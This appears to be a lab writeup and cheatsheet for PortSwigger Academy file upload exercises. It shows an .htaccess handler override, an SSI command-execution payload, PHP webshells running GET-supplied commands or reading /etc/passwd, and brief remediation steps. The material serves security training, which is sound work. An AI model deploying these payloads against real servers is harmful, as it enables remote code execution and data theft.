# PortSwigger Web Security Academy: File Upload & Web Shells

![Category](https://img.shields.io/badge/Category-Web_Security-blue.svg)
![Source](https://img.shields.io/badge/Source-PortSwigger_Academy-orange.svg)
![Topic](https://img.shields.io/badge/Topic-File_Upload_Vulnerabilities-purple.svg)

A technical reference writeup and cheatsheet collection covering advanced **File Upload Vulnerabilities**, Apache `.htaccess` overrides, Server-Side Includes (SSI), and webshell payloads from the PortSwigger Web Security Academy.

---

## 📋 Executive Summary
Insecure file uploads represent one of the most critical vulnerabilities in web applications. This repository contains practical exploit configurations and payloads used across PortSwigger Academy labs to bypass file extension blacklists, content-type checks, and path traversal restrictions.

* **Artifacts in Directory:**
  * `file2`: Apache `.htaccess` configuration override mapping `.l33t` to PHP
  * `temp.shtml`: Server-Side Includes (SSI) command execution payload
  * `phpcheatsheat`: Quick-reference PHP webshell snippets
  * `php-reverse-shell.php`: Full-featured PHP PentestMonkey reverse shell

---

## 💥 Lab Techniques & Payloads

### 1. Overriding Server Configuration via `.htaccess` (`file2`)
When the web server blocks `.php` files but permits uploading configuration files, an attacker can upload a custom `.htaccess` file to map an unblocked arbitrary extension (e.g., `.l33t`) to the PHP execution handler:
```apache
AddType application/x-httpd-php .l33t
```
* **Follow-up:** Upload `exploit.l33t` containing PHP code. The Apache server executes it as native PHP.

---

### 2. Server-Side Includes (SSI) Injection (`temp.shtml`)
When PHP execution is disabled but Server-Side Includes are enabled for `.shtml` files:
```html
<!--#exec cmd="cat /home/carlos/secret" -->
```
Or reading local files directly via PHP wrappers:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

---

### 3. Quick-Reference Webshells (`phpcheatsheat`)
* **Single Command Execution:**
  ```php
  <?php echo system($_GET['command']); ?>
  ```
  *Trigger:* `GET /uploads/exploit.php?command=id HTTP/1.1`
* **File Disclosure:**
  ```php
  <?php echo file_get_contents('/etc/passwd'); ?>
  ```

---

## 🛡️ Remediation
1. **Never Execute Uploaded Files:** Store user-uploaded files on an isolated domain (e.g., AWS S3 or a separate CDN) with execution permissions disabled.
2. **Disable Dangerous Overrides:** Set `AllowOverride None` in Apache configurations to prevent `.htaccess` tampering.
3. **MIME Type & Extension Whitelisting:** Validate files using strict extension whitelists and inspect binary file headers (magic bytes).
